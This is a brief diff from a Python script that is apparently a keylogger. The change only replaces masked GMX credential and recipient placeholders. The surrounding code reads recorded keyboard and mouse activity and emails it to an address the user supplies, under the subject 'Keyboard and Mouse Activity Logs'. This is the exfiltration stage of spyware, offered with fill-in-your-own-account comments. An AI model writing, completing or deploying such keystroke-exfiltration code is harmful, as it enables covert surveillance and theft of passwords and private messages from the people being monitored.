@@ -52,14 +52,14 @@ def send_email():
             mouse_data = f.read()
 
         # GMX email login credentials
-        gmx_user = '***'  # Replace with your GMX email
-        gmx_password = '****'  # Replace with your GMX password
+        gmx_user = '******'  # Replace with your GMX email
+        gmx_password = '*****'  # Replace with your GMX password
 
         # Create email message
         message = EmailMessage()
         message['Subject'] = 'Keyboard and Mouse Activity Logs'
         message['From'] = gmx_user
-        message['To'] = '******'  # Replace with your recipient email
+        message['To'] = '*****'  # Replace with your recipient email
         message.set_content(f"Here are the recent logs:\n\nKeyboard:\n{keyboard_data}\n\nMouse:\n{mouse_data}")
 
         # Attach files
